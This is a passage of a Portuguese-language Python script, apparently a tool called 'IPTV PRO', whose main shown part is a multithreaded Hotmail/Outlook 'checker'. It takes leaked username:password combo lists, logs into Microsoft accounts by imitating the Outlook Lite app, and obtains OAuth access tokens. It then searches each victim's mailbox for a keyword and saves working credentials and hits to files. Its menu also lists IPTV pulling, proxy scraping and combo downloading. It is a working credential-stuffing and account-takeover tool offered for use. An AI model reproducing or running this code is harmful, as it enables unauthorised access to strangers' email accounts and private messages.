        return {"status":"FAILURE","reason":"No PPFT"}
    PPFT = ppft_match.group(1)
    ad_match = re.search(r'^(.*)haschrome=1', str(addr2))
    AD = ad_match.group(1) if ad_match else str(addr2)

    post_data = f"i13=1&login={user}&loginfmt={user}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
    cookie_header = f"MSPRequ={cookies_jar.get('MSPRequ','')}; uaid={cookies_jar.get('uaid','')}; RefreshTokenSso={cookies_jar.get('RefreshTokenSso','')}; MSPOK={cookies_jar.get('MSPOK','')}; OParams={cookies_jar.get('OParams','')}; MicrosoftApplicationsTelemetryDeviceId={UUID}"
    headers3 = {
        "Host": "login.live.com", "Connection": "keep-alive", "Content-Length": str(len(post_data)),
        "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://login.live.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "X-Requested-With": "com.microsoft.outlooklite", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": f"{AD}haschrome=1",
        "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Cookie": cookie_header
    }
    try:
        r3 = session.post(URL, data=post_data, headers=headers3, allow_redirects=False, timeout=30)
        src3 = r3.text
        addr3 = r3.url if r3.is_redirect else str(r3.headers.get('Location',''))
    except:
        return {"status":"FAILURE","reason":"Login post error"}

    cookies_jar.update(session.cookies.get_dict())
    cookies_all = str(cookies_jar)
    errors_count = src3.lower().count("error")
    success_login = any(x in cookies_all for x in ["JSH","JSHP","ANON","WLSSC"]) or "https://login.live.com/oauth20_desktop.srf?" in addr3 or "fntobu-y" in src3

    if "account or password is incorrect" in src3 or errors_count>0:
        return {"status":"FAILURE","reason":"Incorrect user/pass"}
    if "https://account.live.com/identity/confirm" in src3:
        return {"status":"FAILURE","reason":"Identity confirm required"}
    if "https://account.live.com/recover" in src3:
        return {"status":"FAILURE","reason":"Recovery required"}
    if "https://account.live.com/Abuse" in src3 or "https://login.live.com/finisherror.srf" in addr3:
        return {"status":"FAILURE","reason":"Account locked/abuse"}
    if "too many times with" in src3:
        return {"status":"BAN","reason":"Too many attempts"}
    if not success_login:
        return {"status":"FAILURE","reason":"Login not successful"}

    loc = r3.headers.get('Location','')
    code_match = re.search(r'code=([^&]+)&', loc)
    if not code_match:
        return {"status":"FAILURE","reason":"No auth code"}
    Code = code_match.group(1)
    MSPCID = cookies_jar.get('MSPCID','')
    CID = MSPCID.upper()
    url4 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
    token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={Code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
    headers4 = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r4 = session.post(url4, data=token_data, headers=headers4, allow_redirects=False, timeout=30)
        if "access_token" not in r4.text:
            return {"status":"FAILURE","reason":"No access token"}
        ATK = r4.json().get('access_token','')
    except:
        return {"status":"FAILURE","reason":"Token parse error"}

    captures = {}
    url5 = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
    headers5 = {"User-Agent":"Outlook-Android/2.0","Pragma":"no-cache","Accept":"application/json",
                "ForceSync":"false","Authorization":f"Bearer {ATK}","X-AnchorMailbox":f"CID:{CID}",
                "Host":"substrate.office.com","Connection":"Keep-Alive","Accept-Encoding":"gzip"}
    try:
        r5 = session.get(url5, headers=headers5, timeout=30)
        prof = r5.json()
        if prof.get('displayName'): captures['Name'] = prof['displayName']
        if prof.get('location'): captures['Country'] = prof['location']
    except: pass

    search_body = f'{{"Cvid":"49c85090-df47-7cfc-7dff-b6f493b9eaec","Scenario":{{"Name":"owa.react"}},"TimeZone":"E. South America Standard Time","TextDecorations":"Off","EntityRequests":[{{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{{"Or":[{{"Term":{{"DistinguishedFolderName":"msgfolderroot"}}}},{{"Term":{{"DistinguishedFolderName":"DeletedItems"}}}}]}},"From":0,"Query":{{"QueryString":"{keyword}"}},"RefiningQueries":null,"Size":25,"Sort":[{{"Field":"Time","SortDirection":"Desc"}}],"EnableTopResults":false,"TopResultsCount":0}}],"QueryAlterationOptions":{{"EnableSuggestion":true,"EnableAlteration":true,"SupportedRecourseDisplayTypes":["Suggestion","NoResultModification","NoResultFolderRefinerModification","NoRequeryModification","Modification"]}},"LogicalId":"50288413-6c68-e7d3-ab47-2be5431628f2"}}'
    url7 = "https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124"
    headers7 = {"User-Agent":"Outlook-Android/2.0","Pragma":"no-cache","Accept":"application/json",
                "ForceSync":"false","Authorization":f"Bearer {ATK}","X-AnchorMailbox":f"CID:{CID}",
                "Host":"substrate.office.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","Content-Type":"application/json"}
    try:
        r7 = session.post(url7, data=search_body, headers=headers7, timeout=30)
        data7 = r7.json()
        total = data7.get('Total','')
        if total == '':
            entity_sets = data7.get('EntitySets',[])
            if entity_sets and entity_sets[0].get('ResultSets'):
                total = entity_sets[0]['ResultSets'][0].get('Total','0')
        captures['Total'] = str(total)
    except:
        captures['Total'] = '0'

    total_int = int(captures.get('Total','0'))
    if total_int == 0:
        return {"status":"LIVE","reason":"Live no emails","captures":captures,"user":user,"password":password}
    else:
        return {"status":"KEYWORD_FOUND","reason":f"Found {total_int} emails","captures":captures,"user":user,"password":password}

class HotmailChecker:
    def __init__(self, keyword, num_threads=4):
        self.keyword = keyword
        self.num_threads = num_threads
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.total_accounts = 0
        self.processed = 0
        self.live_count = 0
        self.keyword_count = 0
        self.failure_count = 0
        self.live_file = None
        self.keyword_file = None
        self.existing_live = set()
        self.existing_keyword = set()

    def set_combo_name(self, combo_name):
        base = sanitize_filename(combo_name)
        self.live_file = HOTMAIL_HITS_DIR / f"{base}_live.txt"
        self.keyword_file = HOTMAIL_HITS_DIR / f"{base}_keyword.txt"
        self.load_existing_results()

    def load_existing_results(self):
        self.existing_live.clear()
        self.existing_keyword.clear()
        if self.live_file and self.live_file.exists():
            with open(self.live_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line:
                        user = line.split(':')[0].strip()
                        self.existing_live.add(user)
        if self.keyword_file and self.keyword_file.exists():
            with open(self.keyword_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line:
                        user = line.split(':')[0].strip()
                        self.existing_keyword.add(user)

    def save_result(self, result):
        user = result.get('user','')
        password = result.get('password','')
        status = result.get('status','')
        total_emails = result.get('captures',{}).get('Total','0')
        with self.lock:
            if status in ["LIVE","KEYWORD_FOUND"] and user not in self.existing_live:
                with open(self.live_file, 'a', encoding='utf-8') as f:
                    f.write(f"{user}:{password}\n")
                self.existing_live.add(user)
            if status == "KEYWORD_FOUND" and user not in self.existing_keyword:
                with open(self.keyword_file, 'a', encoding='utf-8') as f:
                    f.write(f"{user}:{password} palavra: {self.keyword} vezes: {total_emails}\n")
                self.existing_keyword.add(user)

    def worker(self):
        while True:
            try:
                acc = self.queue.get(timeout=1)
                if acc is None:
                    break
                user = acc['user']
                pwd = acc['password']
                res = check_hotmail_account(user, pwd, self.keyword)
                res['user'] = user
                res['password'] = pwd
                with self.lock:
                    self.processed += 1
                    st = res.get('status','')
                    if st == "LIVE":
                        self.live_count += 1
                        color = "🟢"
                    elif st == "KEYWORD_FOUND":
                        self.keyword_count += 1
                        color = "✅"
                    else:
                        self.failure_count += 1
                        color = "❌"
                    print(f"[{self.processed}/{self.total_accounts}] {color} {user} - {st}: {res.get('reason')}")
                self.save_result(res)
                self.queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                with self.lock:
                    self.processed += 1
                    self.failure_count += 1
                    print(f"[{self.processed}/{self.total_accounts}] ❌ {acc['user']} - ERROR: {str(e)[:50]}")
                self.queue.task_done()

    def process_accounts(self, accounts, combo_name):
        self.total_accounts = len(accounts)
        self.set_combo_name(combo_name)
        print(f"\n📊 TOTAL DE CONTAS: {self.total_accounts}")
        print(f"🔍 BUSCANDO POR: '{self.keyword}'")
        print(f"⚡ THREADS: {self.num_threads}")
        print(f"📁 LIVE -> {self.live_file}")
        print(f"📁 KEYWORD -> {self.keyword_file}")
        print("-"*60)
        for acc in accounts:
            self.queue.put(acc)
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        self.queue.join()
        for _ in range(self.num_threads):
            self.queue.put(None)
        for t in threads:
            t.join()
        self.generate_report()

    def generate_report(self):
        report = f"""
{'='*60}
RELATÓRIO HOTMAIL - SEM DUPLICATAS
{'='*60}
Palavra-chave: {self.keyword}
Total de contas: {self.total_accounts}
✅ Contas com palavra-chave: {self.keyword_count}
🟢 Contas LIVE (sem palavra): {self.live_count}
❌ Contas com falha: {self.failure_count}
{'='*60}
Arquivos gerados:
• {self.live_file} -> {len(self.existing_live)} contas LIVE
• {self.keyword_file} -> {len(self.existing_keyword)} contas com palavra
{'='*60}
"""
        print(report)

def load_hotmail_accounts(file_path):
    accounts = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    u, p = line.split(':',1)
                    accounts.append({'user':u.strip(), 'password':p.strip()})
    except:
        pass
    return accounts

def hotmail_checker_menu():
    while True:
        clear_console()
        print_with_color("╔══════════════════════════════════════╗", "cyan")
        print_with_color("║       CHECKER HOTMAIL/OUTLOOK       ║", "cyan")
        print_with_color("╚══════════════════════════════════════╝", "cyan")
        files = list(HOTMAIL_COMBO_DIR.glob("*.txt"))
        if not files:
            print_with_color("[!] Nenhum combo em 'hotmail/combos'", "red")
            input("\nPressione Enter para voltar...")
            break
        print("\nArquivos disponíveis:")
        for i, f in enumerate(files,1):
            print(f"{i}. {f.name}")
        print("0. Voltar")
        ch = input("\nEscolha: ").strip()
        if ch == "0":
            break
        if not ch.isdigit() or int(ch) < 1 or int(ch) > len(files):
            print_with_color("Opção inválida.", "red")
            input("Pressione Enter...")
            continue
        combo_file = files[int(ch)-1]
        keyword = input("🔍 Palavra-chave: ").strip()
        if not keyword:
            print_with_color("Palavra-chave não pode estar vazia.", "red")
            input("Pressione Enter...")
            continue
        try:
            threads = int(input("Threads (padrão 4): ") or 4)
        except:
            threads = 4
        accounts = load_hotmail_accounts(combo_file)
        if not accounts:
            print_with_color("Nenhuma conta encontrada.", "red")
            input("Pressione Enter...")
            continue
        print(f"\n✅ {len(accounts)} contas carregadas.")
        input("Pressione Enter para iniciar...")
        checker = HotmailChecker(keyword, threads)
        checker.process_accounts(accounts, combo_file.stem)
        input("\nPressione Enter para voltar...")

def main():
    while True:
        clear_console()
        print(f"""
{Colors.GREEN}╔══════════════════════════════════════╗
║             IPTV PRO                    ║
║            by: @Zvzin7                  ║
╚══════════════════════════════════════╝{Colors.RESET}
{Colors.CYAN}1.{Colors.RESET} Puxar IPTV
{Colors.CYAN}2.{Colors.RESET} Buscar Proxys (não está funcionando corretamente)
{Colors.CYAN}3.{Colors.RESET} Gerenciar Combos + baixar combos/proxys
{Colors.CYAN}4.{Colors.RESET} Chk Hotmail
{Colors.CYAN}5.{Colors.RESET} Verificar Atualizações
{Colors.CYAN}6.{Colors.RESET} Sair
        """)
        op = input("Escolha: ").strip()
        if op == "1":
            run_iptv_check()
            input("\nPressione Enter...")
        elif op == "2":
            ptype = input("Tipo:\n1 - HTTP/HTTPS\n2 - SOCKS4/5\n: ")
            if ptype not in ("1","2"):
                continue
            target = int(input("Quantidade desejada: ") or 300)
            max_ms = int(input("Velocidade máxima (ms): ") or 50)
            threads = int(input("Threads teste: ") or 200)
            fetch_proxies_online(int(ptype), target, max_ms, threads)
            input("\nPressione Enter...")
        elif op == "3":
            create_combos_menu()
        elif op == "4":
            hotmail_checker_menu()
        elif op == "5":
            should_update, content = check_for_updates()
            if should_update and content:
                apply_update(content)
            else:
                input("\nPressione Enter...")
        elif op == "6":
            log("[+] Encerrando...", Colors.CYAN)
            break
        else:
            log("[!] Opção inválida.", Colors.YELLOW)
            input("Pressione Enter...")

if __name__ == "__main__":
    main()